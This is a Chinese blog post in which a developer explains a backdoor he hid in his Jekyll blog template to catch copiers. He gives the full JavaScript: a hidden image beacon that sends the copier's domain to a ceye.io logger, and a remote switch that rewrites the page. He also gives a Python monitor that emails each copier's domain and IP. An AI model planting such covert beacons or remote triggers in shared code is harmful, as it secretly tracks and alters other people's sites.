@@ -1,0 +1,174 @@
+I"�S<h1 id="前言">前言</h1>
+
+<p>在前段时间，我在我博客的模板上加入了后门（JavaScript），今天去除，并将思路简单的写出来。</p>
+
+<h2 id="为什么留后门呢">为什么留后门呢？</h2>
+
+<p><strong>起因</strong>：在前不久，团队官网模板就被偷走，很让人生气，抄袭者团队（以下简称为：A）没有打一声招呼就拿走了，但可笑的是A并没有在模板中修改JavaScript文件的外链引用，而是直接使用我们的JavaScript文件，所以简单的利用JS修改了一下其主页，提醒了下他，经过后来A主动与我联系并道歉，这件事情才结束～</p>
+
+<p>让我吃惊的是，这件事之后我发现我博客主题模板被拿走了，是的，不止一个哥们。</p>
+
+<p>我在我的博客项目中说明了<code class="language-plaintext highlighter-rouge">https://github.com/gh0stkey/gh0stkey.github.io</code></p>
+
+<blockquote>
+  <p>个人博客 gh0st.cn 模版来自：https://github.com/heiswayi/the-plain 在原基础上增加了分页、网易云音乐播放器等功能（做了一些排版细节上的调整），拿之前告诉我下，谢谢！</p>
+</blockquote>
+
+<p>因为博客采用的是Github Pages + Jekyll，所以需要依赖于Github的进行托管，模板也就自然而然的可以直接<code class="language-plaintext highlighter-rouge">git clone</code>下来，模板也是我进行二次修改的，我觉得起码要尊重下作者，在博客主题或项目之类的进行说明，打声招呼也行，一声不吭的拿走是几个意思……</p>
+
+<p>有个好兄弟说过这样一段话，望周知：</p>
+
+<blockquote>
+  <p>参考别人的研究成果著名来源是基本素质，每个人都应该构建一个和谐积极向上的氛围，知道的人不愿意分享的原因就是不被别人认可，互相认可才能进步，现在理解一些师傅的苦衷了，挺悲哀的。请各位在以后的学习生涯上，尊重别人的分享，认可他人，互相感染才能进步。</p>
+</blockquote>
+
+<h1 id="关于后门">关于后门</h1>
+
+<p>我是一个“重度洁癖患者”，不喜欢自己的任何东西带上任何污点。包括对于在自己博客模板中加入后门，这对我来说是一件带有“大污点”的事情，所以思考了很久决定加上后门。</p>
+
+<h2 id="后门的构建">后门的构建</h2>
+
+<h3 id="javascript-后门">JavaScript 后门</h3>
+
+<p>模板后门选择的是JavaScript外链引用，而JavaScript的内容构建步骤如下：</p>
+
+<p><strong>1.判断是否是自己的域名（这个正则写的不严谨是可以被绕过的，例如：<code class="language-plaintext highlighter-rouge">gh0st.cn.bypass.cn</code>）：</strong></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span> <span class="c1">//获取host</span>
+<span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/gh0st.cn/</span><span class="p">);</span> <span class="c1">//创建正则</span>
+<span class="kd">var</span> <span class="nx">isok</span> <span class="o">=</span> <span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">host</span><span class="p">);</span> <span class="c1">//匹配结果：False\True</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isok</span><span class="p">){</span><span class="c1">//判断</span>
+	<span class="p">...</span><span class="nx">code</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>2.触发式：在一个Web服务上添加了isopen.txt这个文件，内容为NO则不触发，内容为YES则触发。（选择触发式的原因是因为博客上线有本地调试这一环节，如果在本地就触发了，那岂不是得不偿失，没有造成什么直接损害～）</strong></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> <span class="c1">//创建XMLHttpRequest</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span> <span class="c1">//请求成功则触发</span>
+	<span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">YES</span><span class="dl">"</span><span class="p">){</span> <span class="c1">//判断请求网站的内容是否是YES，如果是则进行下一步</span>
+		<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;center&gt;&lt;h1&gt;Please tell me before using my template!By:[Vulkey_Chen]&lt;center&gt;&lt;h1&gt;</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//页面内容修改</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://webserver/isopen.txt</span><span class="dl">"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span> <span class="c1">//请求http://webserver/isopen.txt</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><strong>3.既然选择了触发式的后门，那么就需要知道是谁偷了模板，这里利用的是<code class="language-plaintext highlighter-rouge">ceye.io</code>这个平台去记录“小偷”的域名和IP之类的东西：</strong></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span> <span class="c1">//创建img标签</span>
+<span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://myblog.你的地址.ceye.io/fuck?domain=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">host</span><span class="p">;</span> <span class="c1">//设置img标签的src属性</span>
+<span class="nx">img</span><span class="p">.</span><span class="nx">stytle</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">;</span> <span class="c1">//设置img标签的样式的display属性为none（表示这个将图片隐藏）</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span> <span class="c1">//在DOM节点(body)内加入img标签</span>
+</code></pre></div></div>
+
+<p><strong>4.在博客模板的header.html中引用了外部的JS地址<code class="language-plaintext highlighter-rouge">&lt;script src="http://webserver/xxx.js"&gt;</code></strong></p>
+
+<p>完整代码如下：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">host</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">reg</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="sr">/gh0st.cn/</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">isok</span> <span class="o">=</span> <span class="nx">reg</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">host</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isok</span><span class="p">){</span>
+	<span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">img</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://myblog.你的地址.ceye.io/fuck?domain=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">host</span><span class="p">;</span>
+    <span class="nx">img</span><span class="p">.</span><span class="nx">stytle</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">YES</span><span class="dl">"</span><span class="p">){</span>
+        	<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;center&gt;&lt;h1&gt;Please tell me before using my template!By:[Vulkey_Chen]&lt;center&gt;&lt;h1&gt;</span><span class="dl">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://webserver/isopen.txt</span><span class="dl">"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="python-监控">Python 监控</h3>
+
+<p>利用<code class="language-plaintext highlighter-rouge">ceye.io</code>这个平台的API去实时监控，并且使用邮件发信通知。</p>
+
+<p>导入Python模块 &amp;&amp; 全局变量：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">smtplib</span><span class="p">,</span><span class="n">requests</span><span class="p">,</span><span class="n">json</span><span class="p">,</span><span class="n">urlparse</span><span class="p">,</span><span class="n">sys</span>
+<span class="kn">from</span> <span class="nn">email.MIMEText</span> <span class="kn">import</span> <span class="n">MIMEText</span>
+<span class="kn">from</span> <span class="nn">email.Utils</span> <span class="kn">import</span> <span class="n">formatdate</span>
+<span class="kn">from</span> <span class="nn">email.Header</span> <span class="kn">import</span> <span class="n">Header</span>
+
+<span class="n">log</span> <span class="o">=</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<p><strong>1.163邮件发信：</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_mail</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="n">ip</span><span class="p">):</span>
+	<span class="n">smtpHost</span> <span class="o">=</span> <span class="s">'smtp.163.com'</span>
+	<span class="n">smtpPort</span> <span class="o">=</span> <span class="s">'25'</span>
+	<span class="n">fromMail</span> <span class="o">=</span> <span class="s">'邮箱账户'</span>
+	<span class="n">toMail</span> <span class="o">=</span> <span class="s">'邮箱账户,收信方'</span>
+	<span class="n">username</span> <span class="o">=</span> <span class="s">'邮箱账户'</span>
+	<span class="n">password</span> <span class="o">=</span> <span class="s">'邮箱密码'</span>
+	<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">'utf8'</span><span class="p">)</span>
+
+	<span class="n">subject</span> <span class="o">=</span> <span class="s">u'博客监控到有人偷模板！'</span>
+	<span class="n">body</span> <span class="o">=</span> <span class="s">u"[小偷信息]</span><span class="se">\n</span><span class="s">Domain: {0} IP: {1}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>
+
+	<span class="n">encoding</span> <span class="o">=</span> <span class="s">'utf-8'</span>
+	<span class="n">mail</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">body</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="p">),</span><span class="s">'plain'</span><span class="p">,</span><span class="n">encoding</span><span class="p">)</span>
+	<span class="n">mail</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span><span class="n">encoding</span><span class="p">)</span>
+	<span class="n">mail</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">fromMail</span>
+	<span class="n">mail</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span> <span class="n">toMail</span>
+	<span class="n">mail</span><span class="p">[</span><span class="s">'Date'</span><span class="p">]</span> <span class="o">=</span> <span class="n">formatdate</span><span class="p">()</span>
+
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">smtpHost</span><span class="p">,</span><span class="n">smtpPort</span><span class="p">)</span>
+		<span class="n">smtp</span><span class="p">.</span><span class="n">ehlo</span><span class="p">()</span>
+		<span class="n">smtp</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
+		<span class="n">smtp</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">fromMail</span><span class="p">,</span><span class="n">toMail</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">),</span><span class="n">mail</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
+		<span class="k">print</span> <span class="s">u"邮件已发送，监控信息："</span>
+		<span class="k">print</span> <span class="n">body</span>
+	<span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span><span class="n">e</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">e</span>
+		<span class="k">print</span> <span class="s">u"发送失败，监控信息："</span>
+		<span class="k">print</span> <span class="n">body</span>
+	<span class="k">finally</span><span class="p">:</span>
+		<span class="n">smtp</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>2.ceye.io API调用获取信息，<a href="http://ceye.io/profile">个人中心</a>可以看见API TOKEN，<a href="http://ceye.io/api">API使用方法</a>：</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dnslog_monitor</span><span class="p">():</span>
+	<span class="n">api</span> <span class="o">=</span> <span class="s">"http://api.ceye.io/v1/records?token=你的TOKEN&amp;type=http&amp;filter=myblog"</span>
+	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">api</span><span class="p">)</span>
+	<span class="n">json_data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">json_data</span><span class="p">[</span><span class="s">'data'</span><span class="p">]:</span>
+		<span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s">'name'</span><span class="p">]).</span><span class="n">query</span>
+		<span class="n">sb_domain</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">([(</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">query</span><span class="p">).</span><span class="n">items</span><span class="p">()])[</span><span class="s">'domain'</span><span class="p">]</span>
+		<span class="n">sb_ip</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="s">'remote_addr'</span><span class="p">]</span>
+		<span class="k">if</span> <span class="n">sb_domain</span> <span class="ow">in</span> <span class="n">log</span><span class="p">:</span>
+			<span class="k">pass</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">log</span><span class="p">[</span><span class="n">sb_domain</span><span class="p">]</span> <span class="o">=</span> <span class="n">sb_ip</span>
+			<span class="n">send_mail</span><span class="p">(</span><span class="n">sb_domain</span><span class="p">,</span><span class="n">sb_ip</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>3.main函数：</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">dnslog_monitor</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="后门的运行">后门的运行</h2>
+
+<p>python脚本挂在服务器跑了一段时间，也发现了一个哥们又拿走了我的博客模板：</p>
+
+<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2019-01-23/0.png" alt="oh,no" /></p>
+
+<p>让他”用”了一段时间，便将isopen.txt的内容改为了YES（即触发了后门），其后来也与我联系，并进行了和解。</p>
+
+<h1 id="写在最后的话">写在最后的话</h1>
+
+<p>也是因为“重度洁癖”，决定将模板后门去除。望君尊重技术、分享、作者，共勉！</p>
+:ET
